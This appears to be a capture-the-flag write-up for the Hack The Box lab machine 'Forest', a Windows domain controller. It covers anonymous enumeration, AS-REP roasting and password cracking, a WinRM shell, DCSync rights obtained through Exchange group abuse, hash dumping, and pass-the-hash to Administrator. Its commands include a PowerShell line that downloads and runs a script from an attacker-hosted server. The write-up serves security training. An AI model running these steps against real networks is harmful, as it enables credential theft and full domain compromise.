# Machine Overview

Forest is an easy difficulty, Windows Domain Controller (DC) for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain users. The password for a service account with **Kerberos pre-authentication** disabled can be cracked to gain a foothold as **svc-alfresco**. The service account is found to be a member of the Account Operators group, which can be used to add users to **privileged Exchange groups**. The Exchange group membership is leveraged to gain **DCSync** privileges on the domain and dump the NTLM hashes. The admin NT hash is used to gain shell as **Administrator** through a **Pass-the-Hash** attack.

# User
## Enumeration through Nmap

First of all, we will conduct an nmap scan to analyze the entire network and identify the services running on it. To scan all ports and discover any open ones, I'll utilize the `-p-` flag along with `--min-rate 10000` to expedite the network scan with nmap. This will provide us with a comprehensive list of open ports across the network.

<img width="594" alt="Pasted image 20240103225607" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/f52d2c91-ce1e-44af-8375-d0cfdb7a5933">

Let's filter these ports and inspect the services running on them. I used two different utilities, tr and cut, in Kali Linux for this purpose. **tr** is employed to replace characters, while **cut** is utilized to extract specific content from the file. The command I used to filter out open ports is `cat nmap.txt | cut -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','`.

<img width="876" alt="Pasted image 20240103225839" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/4fbe5c5c-d1ad-4c8d-b61f-3706453ba01b">

Now, let's run a service check on these specific ports using.

```bash
$ nmap -p88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49682,49694,49711 -sCV -A -T4 10.10.10.161 -oN scan.txt

## Information Gathering

Through Nmap, we found that port 53 (DNS) is open, which can be used to perform zone transfers. Port 88 (Kerberos) is also open, useful for enumeration purposes. Additionally, ports 139 and 445 (SMB) are open, which can be used to enumerate shares with anonymous user access for initial access. Port 389 (LDAP) and port 5985 (WinRM) are also open, with the latter potentially allowing login if valid credentials are obtained. Nmap discovered the domain name as "htb.local" using LDAP scripts. Let's add this domain to our local DNS file called "/etc/hosts" so that our computer can resolve it.

```bash
$ echo "10.10.10.161   htb.local" | sudo tee -a /etc/hosts
```

### SMB 139 & 445

**Server Message Block** (SMB) is a network file-sharing protocol that enables applications on a computer to read and write files and request services from server programs within a computer network. It is widely used in Windows environments for sharing files, printers, and other resources.

**smbclient** is a command-line utility that facilitates access to and interaction with servers utilizing the Server Message Block (SMB) protocol.

```bash
$ smbclient -L 10.10.10.161
```

-  **-L** is used to list all the shares

<img width="663" alt="Pasted image 20231130195233" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/f89a3cff-6e4c-4dac-824d-3c36587a34fd">
  
We successfully logged in using anonymous credentials to SMB but didn't find any shares. Since anonymous login is enabled, we can enumerate the domain using [enum4linux](https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/).

[enum4linux](https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/) is a Linux utility used for enumerating information from **Windows** and **Samba** systems. It is designed to extract valuable information during the post-exploitation phase of penetration testing or security assessments. The tool is particularly useful for **gathering information** about shares, users, and other details from SMB (Server Message Block) servers. You can use [enum4linux](https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/) -h for its help menu.

```bash
$ enum4linux -d -r -o 10.10.10.161
```

- **-d** is for detailed user and share list enumeration
-  **-r** is for enumerating users via RID cycling
- **-o** is for OS information

We obtained the domain SID (Security Identifier), which we can use to perform Silver ticket or Golden Ticket attacks, as well as some usernames.

**SID (Security Identifier):** SIDs are a component of a security database that security authorities can use to identify the user and the permissions that user is entitled to. When users log on to a Windows system, the system generates an access token that includes the user SID, the SID of any groups the user belongs to, and the user privilege level. The SID we obtained is `S-1-5-21-3072663084-364016917-1341370565`.

<img width="597" alt="Pasted image 20230720231239" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/baaba90f-dc41-454f-856a-ad3e6a3679ab">
 
Let's save these names in a file.
 
### 389 LDAP

We will use the tool **ldapsearch** to enumerate the domain LDAP service. **ldapsearch** is a command-line tool that **opens a connection to an LDAP server, binds to it, and performs a search using a filter**. The results are then displayed in LDIF format. LDIF is used to represent LDAP entries in a simple text format. **ldapsearch** is similar to **enum4linux** but focuses on LDAP (Lightweight Directory Access Protocol).

```bash
$ ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.10.10.161 | grep userPrincipalName
```

- **-x** is for simple authentication.
- **-H** is for defining the host.
- `*` is used to enumerate all user's attributes.
- **-b** is for the base DN for the search.
- **grep userPrincipalName** to get the user's list present in the domain

The Base DN is the starting point an LDAP server uses when searching for user authentication within Active Directory. For example: **DC=example-domain,DC=com**.

The **userPrincipalName** (UPN) is the most common logon name for Windows users. Users typically use their UPN to log on to a domain. This attribute is a single-valued indexed string.

<img width="591" alt="Pasted image 20230720231146" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/d9eca00a-6ed6-4b1c-922d-4b0287584cee">

## Exploitation
### As-Reproasting Attack

Now that we have a valid username, we can try an **AS-Rep Roasting** attack to check if any of the users have **Does not require Pre-Authentication** enabled.
**AS-REP Roasting** is a technique that allows attackers to steal the password hashes of user accounts with **Kerberos preauthentication** disabled. If preauthentication is disabled, an attacker could request authentication data for any user, and the Domain Controller (DC) would return an **AS-REP** message. Since part of that message is **encrypted** using the user’s password, the attacker can then attempt to brute-force the user’s password offline.

```bash
$ GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile user1.txt -format john -outputfile hashes
```

- **-dc-ip** is used to set the domain IO.
- **-users-file** is for providing a list of users.
- **-format john** is to get password hashes in the john hash format.
- **-outputfile** is to specify the file to store hashes.

We found a user with a hash, Let's proceed to crack it.

<img width="950" alt="Pasted image 20230720224514" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/f0d0be4d-37cb-481d-9e7c-5ff805ade990">

#### John The Ripper

**John the Ripper** is a free password cracking tool. Originally developed for the Unix operating system, it can run on fifteen different platforms, including Unix, DOS, Win32, BeOS, and OpenVMS. It is among the most frequently used password testing and breaking programs as it combines a number of password crackers into one package, autodetects password hash types, and includes a customizable cracker. It can be run against various encrypted password formats.

Let's use **John the Ripper** to crack the password of the **svc-alfresco** user. John The Ripper cracked it within a minute.

```bash
$ john hash -w=/usr/share/wordlists/rockyou.txt
```

<img width="623" alt="Pasted image 20230720233836" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/6eef3aab-8fdb-4b78-a6b5-b9881ae066ce">

#### Shell using Evil-Winrm

**Evil-WinRM** is an open-source, command-line-based tool that provides remote shell access to Windows machines over WinRM (Windows Remote Management). **Evil-WinRM** exploits weak configurations present in the WinRM service to establish a remote shell session on a targeted Windows machine, allowing the attacker to perform administrative tasks and run scripts.

```bash
$ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

- **-i** for domain IP address
- **-u** for for user name
- **-p** for password

<img width="953" alt="Pasted image 20240103232450" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/684ba8fd-8a31-4ab3-946f-67d0a9095784">

# Privilege Escalation
## Domain analysis using BloodHound

Bloodhound is a tool commonly used by attackers to visually map an organization’s Active Directory structure and analyze it to find weaknesses. It employs graph theory to reveal hidden and often unintended relationships within an Active Directory or Azure environment. With BloodHound, attackers can easily identify highly complex attack paths that would otherwise be difficult to detect quickly.

```bash
$ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip
```

- **-c** for collection
- **-u** for user name
- **-p** for user password
- **-d** for domain name
- **-ns** for name server
- **--zip** for creation of a zip file of all the gathered data

<img width="932" alt="Pasted image 20230722140546" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/d51f9082-4db1-4390-901a-2ca01b2fa861">
  
This creates a JSON file. Let's upload it to BloodHound to visualize the data. For comprehensive domain enumeration, we can also utilize **SharpHound**, an investigator designed to gather information throughout the domain. **SharpHound** is particularly useful for reconnaissance. Execute `./SharpHound.exe --CollectionMethods All`. Once completed, download the results to your local machine, run BloodHound, upload the data, and begin investigating the graphs.

<img width="953" alt="Pasted image 20240104000743" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/85425653-a90f-4b43-9e92-21b1b102a876">

<img width="881" alt="Pasted image 20240104000824" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/a3f3b1e7-ab2f-4029-8d7d-91b245173657">

To run BloodHound, we first need to start **Neo4j**, which is a graph database system.

<img width="359" alt="Pasted image 20240109135359" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/86a88612-007a-44ad-9108-c3496e9da30c">

Now, type `bloodhound` in a new terminal and press Enter to start BloodHound. If you are running BloodHound for the first time, you need to reset the default credentials, which are `neo4j:neo4j`. After logging into BloodHound, upload the zip file created by **SharpHound**. You can use either method – drag and drop the file into BloodHound or use the "Upload Data" button. Wait for the data to upload into the database.

<img width="296" alt="Pasted image 20240109135829" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/0de4387e-1236-43b4-a32b-ee8c64dc385c">

After successfully uploading the data, the investigation part begins. Mark the **svc_alfresco** user as owned by right-clicking on it and selecting **Mark user as Owned**.

<img width="672" alt="Pasted image 20240104001028" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/9f93fb62-ca97-41de-95b7-515b31725418">

Now, in the Analysis tab, select **Shortest Path -> Shortest Path to Domain Admins From owned Principals**.

<img width="247" alt="Pasted image 20240104001106" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/93c87abd-d2ab-4d4c-bc63-863681542da2">

Let's see if we can find any useful principals.

<img width="494" alt="Pasted image 20240104001403" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/3a069c64-b537-4992-ae64-ca950912e2d7">

Let me explain the graph to you. 
- We owned **svc_alfresco** user
- **svc_alfresco** is a member of Service Account group
- **Service account group** is a member of Privileged IT Accounts group
- **Privileged IT Accounts group** are member of group Account Operator
- Account Operator have **Generic ALL** permissions on Enterprise Key Admins group
- Enterprise Key Admin have write to **AddKeyCredientialLink** to Domain
  
So, here is a summary: **svc_alfresco** is a member of the Service account group, which is a member of the Privileged IT Account group, and which is a member of the Account Operator Group. This implies that we can create new users in the domain. Consequently, our user, svc_alfresco, is also a member of the Account Operator Group, which has **Generic All** rights on the Domain Key Admins group. This allows us to add our new user to that Key Admins group. In the end, the Enterprise Key Admins have the **AddKeyCredentialLink** write over the Domain, which we can use to perform a **Shadow Credentials** attack.

We can't gain admin access through a Shadow Credentials attack because it can only be used for persistence. So, I decided to check **Transitive Object Control** (the number of objects this user can gain control of by performing ACL-only based attacks in Active Directory). In other words, it represents the maximum number of objects the user can control without needing to pivot to any other system in the network, just by manipulating objects in the directory.

By exploring **Transitive Object Control**, I discovered that the **Privileged IT Account** group has access to the **Account Operator Group**, and the **Account Operator group** has **GenericAll** rights on the **Exchange Windows Permissions** group, which, in turn, has **WriteDacl** rights on the Domain.

<img width="934" alt="Pasted image 20240107145103" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/9a27472e-34d7-4bb8-bb80-55743c603d5e">

So, we need to create an account and add it to the **Exchange Windows Permissions** group using **GenericAll** writes, and then grant it **DcSync** permissions through the **WriteDacl** write. We can create a user in the Domain because we have access to the **Account Operator Group**. Let's proceed by creating a user and adding it to Windows Exchange Permissions.

```powershell
$ net user 'admin' 'password' /add /domain
$ net group 'Exchange Windows Permissions' 'admin' /add /domain
```

<img width="960" alt="Pasted image 20240107150202" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/b3366f4c-dc41-4565-be6a-947a1400e254">

Now, we just need to grant **DcSync** permissions to our user. For **Dacl** abuse, we can refer to [hackerrecipes](https://www.thehacker.recipes/a-d/movement/dacl). Let's proceed to exploit it.

```powershell
# give DcSync write using PowerView
$ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.25:8000/PowerView.ps1')

$ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$ $Cred = New-Object System.Management.Automation.PSCredential('htb\admin', $SecPassword)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity admin -Rights DCSync
```

<img width="955" alt="Pasted image 20240107153113" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/33239c6a-496f-4388-b08c-304dd9ad1163">

### DcSyns using Secretsdump.py

Now, let's perform a **DcSync** attack using **secretsdump.py** from the Impacket toolkit 
**SecretsDump.py** is a Python tool by Impacket that can extract secrets from targets. **SecretsDump.py** performs various techniques to dump hashes from the remote machine without executing any agent there. For **SAM** and **LSA** Secrets (including cached creds) it tries to read as much as it can from the **registry** and then saves the hives in the target system `(%SYSTEMROOT%\Temp dir)` and reads the rest of the data from there. For **NTDS.dit** it uses the **Volume Shadow Copy Service** to read NTDS.dit directly from the disk or it can use the parser module to read NTDS.dit files from a copy.

```bash
$ secretsdump.py -dc-ip 10.10.10.161 htb.local/admin:password@10.10.10.161
```
`Administrator:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`

<img width="844" alt="Pasted image 20240107153217" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/550c2a39-694a-4150-b58c-0d785ec6484e">

#### Pass-the-hash

Now, we just need to perform a **Pass-The-Hash** attack to log in to the Administrator account using **PsExec**. 
PsExec is a **light-weight telnet-replacement** that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software.

```bash
$ psexec.py htb.local/Administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'
``` 

And we own domain Administrator.
